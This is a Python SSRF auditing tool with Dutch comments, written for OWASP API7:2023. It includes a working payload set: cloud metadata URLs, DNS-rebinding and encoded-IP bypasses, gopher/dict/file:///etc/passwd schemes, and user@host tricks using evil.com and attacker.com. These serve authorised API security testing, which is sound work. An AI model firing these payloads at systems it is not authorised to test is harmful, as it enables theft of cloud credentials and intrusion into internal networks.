# 
# Licensed under the MIT License. 
# Copyright (c) 2025 Perry Mertens
#
# See the LICENSE file for full license text.
"""
ssrf_audit.py – OWASP API7:2023 (Server-Side Request Forgery)
================================================================
Verbeterde versie met:
- Cloud metadata endpoints (AWS, Azure, GCP, etc.)
- DNS-rebinding payloads
- Time-based detection
- Protocol-specifieke payloads (dict://, sftp://)
- Verbeterde risk assessment
- Uitgebreide rapportage
"""

from __future__ import annotations
import argparse
import ipaddress
import json
import queue
import random
import re
import socket
import string
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from typing import Any, Callable, Dict, Iterable, List, Optional, Tuple
from urllib.parse import quote_plus, urljoin, urlparse
import requests

# ---------------------------------------------------------------------------#
# Typedefs
# ---------------------------------------------------------------------------#
Endpoint = Dict[str, Any]
Finding = Dict[str, Any]
PayloadGenerator = Callable[[], Iterable[str]]
ResponseAnalyzer = Callable[["SSRFAuditor", Endpoint, str, str, requests.Response, float], Optional[Finding]]

# ---------------------------------------------------------------------------#
# Hoofdklasse
# ---------------------------------------------------------------------------#
class SSRFAuditor:
    """Detecteer SSRF-kwetsbaarheden (API7 – OWASP API Top 10 / 2023)."""

    # ------------------------------------------------------------------#
    # Class-constanten
    # ------------------------------------------------------------------#
    URL_PARAM_REGEX = re.compile(
        r"(url|uri|redirect|callback|next|file|path|target|site|link|download)$",
        re.I,
    )
    
    # Basis interne IPs
    IPV4_INTERNALS = [
        "127.0.0.1",
        "0.0.0.0",
        "169.254.169.254",  # AWS metadata
        "169.254.170.2",    # ECS/IMDSv2
        "10.0.0.1",
        "172.16.0.1",
        "192.168.0.1",
    ]
    IPV6_INTERNALS = ["[::1]", "[::ffff:127.0.0.1]"]
    
    # Cloud metadata endpoints
    CLOUD_METADATA_URLS = [
        # AWS
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        # GCP
        "http://metadata.google.internal/computeMetadata/v1/",
        # Azure
        "http://169.254.169.254/metadata/instance",
        # Kubernetes
        "http://10.96.0.1:10255/pods",
        # Alibaba
        "http://100.100.100.200/latest/meta-data/",
    ]
    
    # DNS-rebinding hosts
    DNS_REBINDING_HOSTS = [
        "127.0.0.1.nip.io",
        "localtest.me",
        "localhost.localdomain",
        "2130706433",       # Integer IP
        "0x7f000001",       # Hex IP
        "0177.0000.0000.0001"  # Octal IP
    ]
    
    # Specifieke protocollen
    EXTRA_SCHEMES = ["file", "gopher", "ldap", "dict", "sftp", "tftp"]
    
    # Configuratie
    DEFAULT_CONCURRENCY = 15
    DEFAULT_TIMEOUT = 8
    TIME_DELAY_THRESHOLD = 2.0  # Seconden

    # ------------------------------------------------------------------#
    def __init__(
        self,
        base_url: str,
        session: Optional[requests.Session] = None,
        *,
        collaborator: Optional[str] = None,
        concurrency: int = DEFAULT_CONCURRENCY,
        timeout: int = DEFAULT_TIMEOUT,
        rate_limit_sleep: float = 0.0,
    ) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = session or requests.Session()
        self.collaborator = collaborator
        self.concurrency = concurrency
        self.timeout = timeout
        self.rate_sleep = rate_limit_sleep
        self.session.headers.update({
            "User-Agent": "SSRF-Auditor/1.0"
        })

        self._payload_generators: List[PayloadGenerator] = [self._default_payloads]
        self._payload_generators: List[PayloadGenerator] = [self._default_payloads, self._advanced_payloads]
        self._response_analyzers: List[ResponseAnalyzer] = [self._default_analyzer]
        self._findings: List[Finding] = []
        self._lock = threading.Lock()
        self._oob_hits: queue.Queue[str] = queue.Queue()

        # Registreer aanvullende payload generators
        self._register_extra_generators()

        # Start (optioneel) background OOB-checker
        if self.collaborator:
            threading.Thread(
                target=self._fake_oob_listener, daemon=True, name="oob-listener"
            ).start()

    def _register_extra_generators(self):
        """Registreer aanvullende payload generators."""
        self.register_payload_generator(self._cloud_metadata_payloads)
        self.register_payload_generator(self._dns_rebinding_payloads)
        self.register_payload_generator(self._protocol_specific_payloads)

    # ------------------------------------------------------------------#
    # Publieke API
    # ------------------------------------------------------------------#
    def register_payload_generator(self, gen: PayloadGenerator) -> None:
        self._payload_generators.append(gen)

    def register_response_analyzer(self, fn: ResponseAnalyzer) -> None:
        self._response_analyzers.append(fn)

    def test_endpoints(self, endpoints: List[Endpoint]) -> List[Finding]:
        """Voer SSRF-tests uit over alle endpoints."""
        with ThreadPoolExecutor(max_workers=self.concurrency) as pool:
            futures = [pool.submit(self._test_single_endpoint, ep) for ep in endpoints]
            for _ in as_completed(futures):
                pass
        return self._findings

    # ------------------------------------------------------------------#
    # Discovery helpers
    # ------------------------------------------------------------------#
    @classmethod
    def endpoints_from_swagger(cls, swagger_path: str) -> List[Endpoint]:
        """Parse Swagger/OpenAPI en verzamel endpoints met URL-achtige params."""
        spec = json.loads(Path(swagger_path).read_text(encoding="utf-8"))
        server = _spec_base_url(spec)
        eps: List[Endpoint] = []

        def _iter_parameters(item: dict) -> Iterable[dict]:
            # combineer path + operation-parameters
            return (item.get("parameters", []) +
                    item.get("get", {}).get("parameters", []) +
                    item.get("post", {}).get("parameters", []) +
                    item.get("put", {}).get("parameters", []) +
                    item.get("patch", {}).get("parameters", []) +
                    item.get("delete", {}).get("parameters", []))

        for path, item in spec.get("paths", {}).items():
            for method in ("get", "post", "put", "patch", "delete"):
                if method not in item:
                    continue
                op = item[method]
                params = _iter_parameters({"parameters": item.get("parameters", [])} | op)
                url_like = [p for p in params if cls.URL_PARAM_REGEX.search(p.get("name", ""))]
                if url_like:
                    eps.append(
                        {
                            "base": server or "",
                            "path": path,
                            "method": method.upper(),
                            "param_defs": url_like,
                            "operation_id": op.get("operationId", f"{method.upper()} {path}"),
                        }
                    )
        return eps

    # ------------------------------------------------------------------#
    # Kern-tester
    # ------------------------------------------------------------------#
    def _test_single_endpoint(self, ep: Endpoint):
        for param_def in ep["param_defs"]:
            for payload in self._generate_payloads():
                crafted = self._build_request(ep, param_def, payload)
                try:
                    start = time.time()
                    resp = self.session.request(
                        crafted["method"],
                        crafted["url"],
                        **crafted["send_kwargs"],
                        timeout=self.timeout,
                        allow_redirects=False,
                    )
                    dur = time.time() - start
                except requests.RequestException as exc:
                    resp = _dummy_response(str(exc))
                    dur = self.timeout

                # Response-analyse
                for analyzer in self._response_analyzers:
                    finding = analyzer(self, ep, param_def["name"], payload, resp, dur)
                    if finding:
                        self._record_finding(finding)

                if self.rate_sleep:
                    time.sleep(self.rate_sleep)

    # ------------------------------------------------------------------#
    # Request-opbouw
    # ------------------------------------------------------------------#
    def _build_request(self, ep: Endpoint, param_def: dict, payload: str):
        method = ep["method"].upper()
        raw_path = ep["path"]
        url = urljoin(ep.get("base") or self.base_url, raw_path.lstrip("/"))
        params: Dict[str, Any] = {}
        json_body: Optional[dict] = None

        # ❗ Kopieer standaard headers (zoals User-Agent)
        headers = dict(self.session.headers)

        if param_def.get("in") == "path":
            placeholder = "{" + param_def["name"] + "}"
            url = url.replace(placeholder, quote_plus(payload))
        elif param_def.get("in") == "query":
            params[param_def["name"]] = payload
        elif param_def.get("in") == "header":
            headers[param_def["name"]] = payload
        else:
            json_body = {param_def["name"]: payload}

        return {"method": method, "url": url, "send_kwargs": {"params": params, "json": json_body, "headers": headers}}


    # ------------------------------------------------------------------#
    # Payload-generators
    # ------------------------------------------------------------------#
    def _default_payloads(self) -> Iterable[str]:
        """Combinatie van originele + nieuwe advanced SSRF payloads."""
        nonce = "".join(random.choices(string.ascii_lowercase, k=6))
        if self.collaborator:
            dns_oob = f"http://{nonce}.{self.collaborator}/"
        else:
            dns_oob = None

        # Basiskandidaten
        ips = self.IPV4_INTERNALS + self.IPV6_INTERNALS
        base = [f"http://{ip}/" for ip in ips]

        # Extra rare IP representaties
        rare_ips = [
            "http://0177.0.0.1/",          # Octal IP
            "http://2130706433/",           # Integer IP
            "http://0x7f000001/",           # Hex IP
            "http://127.1/",               # Compact IP
            "http://127.0.1/",              # Alt. localhost
        ]

        # Fancy vectors
        fancy = [
            f"http://{ips[0]}#@example.com",
            f"http://user:pass@{ips[0]}/",
            f"http://{ips[0]}@example.com/",
            f"http://example.com@{ips[0]}/",
            f"http://¤.{ips[0]}/",
            "http://example.com%2f..%2f..%2f",
            "http://localtest.me/",
            "http://127.0.0.1.nip.io/",
            "http://example.com@127.0.0.1/",
        ]

        # Protocol tricks
        protocols = [
            "file:///etc/passwd",
            "gopher://127.0.0.1:22/_SSH",
            "dict://127.0.0.1:22/info",
        ]

        # Unicode/encoding bypasses
        unicode = [
            "http://127。0。0。1/",
            "http://127%E3%80%820%E3%80%820%E3%80%821/",
        ]

        # CRLF / header smuggling
        crlf = [
            f"http://example.com/%0d%0aHost:%20{ips[0]}",
        ]

        # OOB
        oob = [dns_oob] if dns_oob else []

        # Combine alles
        return base + rare_ips + fancy + protocols + unicode + crlf + oob

   

    def _cloud_metadata_payloads(self) -> Iterable[str]:
        """Genereer cloud-metadata payloads."""
        for url in self.CLOUD_METADATA_URLS:
            yield url
            yield url.replace("http://", "http://user:pass@")  # Auth bypass
            yield url.replace("http://", "http://attacker.com@")  # Host-header injectie

    def _dns_rebinding_payloads(self) -> Iterable[str]:
        """Genereer DNS-rebinding payloads."""
        for host in self.DNS_REBINDING_HOSTS:
            yield f"http://{host}/"
            yield f"http://{host}:80@example.com/"
            yield f"http://example.com@{host}/"
            yield f"http://attacker.com@{host}/"

    def _protocol_specific_payloads(self) -> Iterable[str]:
        """Speciale protocol handlers."""
        for proto in self.EXTRA_SCHEMES:
            yield f"{proto}://127.0.0.1/"
            yield f"{proto}://localhost/"
            yield f"{proto}://attacker.com@127.0.0.1/"
    
    def _advanced_payloads(self) -> Iterable[str]:
        """Geavanceerde SSRF payloads inclusief bypass technieken."""
        nonce = "".join(random.choices(string.ascii_lowercase, k=6))

        if self.collaborator:
            dns_oob = f"http://{nonce}.{self.collaborator}/"
        else:
            dns_oob = None

        return [
            # Direct localhost IP's
            "http://127.0.0.1/",
            "http://localhost/",
            "http://0.0.0.0/",
            "http://[::1]/",
            
            # Unicode tricks
            "http://127。0。0。1/",
            "http://localhost%E3%80%82/",
            
            # URL encoded IP tricks
            "http://127%2e0%2e0%2e1/",
            "http://%31%32%37.0.0.1/",
            
            # Username@hostname tricks
            "http://127.0.0.1@evil.com/",
            "http://evil.com@127.0.0.1/",
            "http://localhost@evil.com/",
            
            # Open redirect basis
            "https://trusted.com/redirect?to=http://127.0.0.1",
            "https://trusted.com/redirect?next=http://localhost",
            
            # DNS rebinding tricks
            "http://127.0.0.1.nip.io/",
            "http://localhost.nip.io/",
            "http://127.0.0.1.localtest.me/",
            
            # Protocol-based attacks
            "gopher://127.0.0.1:11211/_stats",
            "gopher://127.0.0.1:3306/",
            "file:///etc/passwd",
            "dict://127.0.0.1:22/info",
            
            # Collaborator for OOB SSRF
            dns_oob if dns_oob else "",
        ]

    
    
    # ------------------------------------------------------------------#
    # Response-analyse
    # ------------------------------------------------------------------#
    
    def _default_analyzer(
        self,
        ep: Endpoint,
        param: str,
        payload: str,
        resp: requests.Response,
        dur: float,
    ) -> Optional[Finding]:
        reason = None
        severity = "Low"
        response_headers = dict(resp.headers)  # Kopieer headers voor rapportage

        # 1. Cloud Metadata Detection
        if any(url in payload for url in self.CLOUD_METADATA_URLS):
            if "Instance Metadata" in resp.text or "iam" in resp.text:
                reason = "Cloud metadata endpoint bereikbaar"
                severity = "Critical"

        # 2. DNS Rebinding Detection
        elif any(host in payload for host in self.DNS_REBINDING_HOSTS):
            if resp.status_code == 200 and len(resp.text) > 0:
                reason = "DNS-rebinding mogelijk via host-header manipulatie"
                severity = "High"

        # 3. Time-Based Detection
        elif dur > self.TIME_DELAY_THRESHOLD:
            reason = f"Time delay ({dur:.2f}s) → mogelijk interne connectie"
            severity = "Medium"

        # 4. Payload reflectie
        elif payload in resp.text:
            reason = "Payload gereflecteerd → mogelijk SSRF via echo"
            severity = "High"

        # 5. Redirect naar interne IP
        elif resp.headers.get("Location", "") and any(
            ip in resp.headers["Location"] for ip in self.IPV4_INTERNALS + self.IPV6_INTERNALS
        ):
            reason = f"Redirect naar interne host ({resp.headers['Location']})"
            severity = "High"

        # 6. Out-of-band hit
        try:
            while True:
                oob = self._oob_hits.get_nowait()
                if oob == payload:
                    reason = "OOB-DNS hit bevestigd"
                    severity = "Critical"
        except queue.Empty:
            pass

        if reason:
            finding = {
                "endpoint": f"{ep['method']} {ep['path']}",
                "parameter": param,
                "payload": payload,
                "result": reason,
                "severity": severity,
                "timestamp": datetime.now().isoformat(timespec="seconds"),
                "response_time": f"{dur:.2f}s",
                "status_code": resp.status_code,
                "response_headers": response_headers,  # Voeg headers toe
            }
            
            # Voeg response body sample toe (beperkt tot eerste 200 chars)
            if resp.text:
                finding["response_sample"] = resp.text[:200]
            
            return finding
        return None

    # ------------------------------------------------------------------#
    # Helpers
    # ------------------------------------------------------------------#
    def _record_finding(self, finding: Finding) -> None:
        with self._lock:
            self._findings.append(finding)

    def _fake_oob_listener(self):
        """Simuleert OOB-hits; vervang door echte DNS-/HTTP-listener."""
        while True:
            time.sleep(3600)

    def _is_internal_ip(self, ip_str: str) -> bool:
        """Controleer of IP intern is (RFC1918, localhost, etc.)."""
        try:
            ip = ipaddress.ip_address(ip_str)
            return ip.is_private or ip.is_loopback
        except ValueError:
            return False

    # ------------------------------------------------------------------#
    # Rapportage
    # ------------------------------------------------------------------#
    def generate_report(self, fmt: str = "markdown") -> str:
        if not self._findings:
            return "Geen SSRF-kwetsbaarheden gevonden."

        if fmt == "json":
            return json.dumps(self._findings, indent=2)

        if fmt == "csv":
            import csv
            from io import StringIO

            buf = StringIO()
            writer = csv.DictWriter(buf, fieldnames=self._findings[0].keys())
            writer.writeheader()
            writer.writerows(self._findings)
            return buf.getvalue()

        # Markdown
        out: List[str] = [
            "# API Security Audit – Server-Side Request Forgery (API7:2023)",
            f"Scan: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"Doel: {self.base_url}",
            f"Configuratie: {self.concurrency} threads, timeout {self.timeout}s",
            "\n## Bevindingen",
        ]
        
        severity_order = ["Critical", "High", "Medium", "Low"]
        for sev in severity_order:
            issues = [f for f in self._findings if f["severity"] == sev]
            if not issues:
                continue
            out.append(f"\n### {sev} risico's ({len(issues)})")
            for i in issues:
                out.append(
                    f"* **{i['endpoint']}** – param `{i['parameter']}` → "
                    f"`{i['payload']}`  \n  ↳ {i['result']} "
                    f"(response time: {i['response_time']})"
                )
        
        # Samenvatting
        out.append("\n## Samenvatting")
        counts = {sev: len([f for f in self._findings if f["severity"] == sev]) 
                for sev in severity_order}
        out.append(f"Totaal bevindingen: {len(self._findings)}")
        out.append(", ".join([f"{k}: {v}" for k, v in counts.items() if v > 0]))
        
        # Aanbevelingen
        out.append("\n## Aanbevelingen")
        out.append("- Implementeer allowlist-based inputvalidatie voor URLs")
        out.append("- Blokkeer toegang tot interne IP-adressen vanuit de API")
        out.append("- Schakel ongebruikte URL-schema's uit (file://, gopher://)")
        out.append("- Monitor ongebruikelijke tijdvertragingen in responses")
        
        return "\n".join(out)

# ---------------------------------------------------------------------------#
# CLI
# ---------------------------------------------------------------------------#
def _spec_base_url(spec: dict) -> str | None:
    """Best-effort: haal eerste servers[].url of swagger.host/basePath."""
    if "servers" in spec and spec["servers"]:
        return spec["servers"][0].get("url", "")
    if "host" in spec:
        scheme = spec.get("schemes", ["https"])[0]
        base = spec.get("basePath", "")
        return f"{scheme}://{spec['host']}{base}"
    return None

def _dummy_response(exc_str: str) -> requests.Response:
    resp = requests.Response()
    resp.status_code = 599
    resp._content = exc_str.encode()
    resp.headers = {}
    return resp

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Audit OWASP API7 – SSRF")
    parser.add_argument("--url", required=True, help="Basis-API-URL")
    parser.add_argument("--swagger", required=True, help="Pad naar Swagger/OpenAPI-JSON")
    parser.add_argument("--collaborator", help="OOB-domein (optioneel)")
    parser.add_argument("--concurrency", type=int, default=SSRFAuditor.DEFAULT_CONCURRENCY)
    parser.add_argument("--timeout", type=int, default=SSRFAuditor.DEFAULT_TIMEOUT)
    parser.add_argument("--rate-limit", type=float, default=0.0, help="Wacht tijd tussen requests")
    parser.add_argument("--output", choices=["markdown", "json", "csv"], default="markdown")
    args = parser.parse_args()

    sess = requests.Session()
    aud = SSRFAuditor(
        args.url,
        sess,
        collaborator=args.collaborator,
        concurrency=args.concurrency,
        timeout=args.timeout,
        rate_limit_sleep=args.rate_limit,
    )
    eps = SSRFAuditor.endpoints_from_swagger(args.swagger)
    aud.test_endpoints(eps)
    print(aud.generate_report(args.output))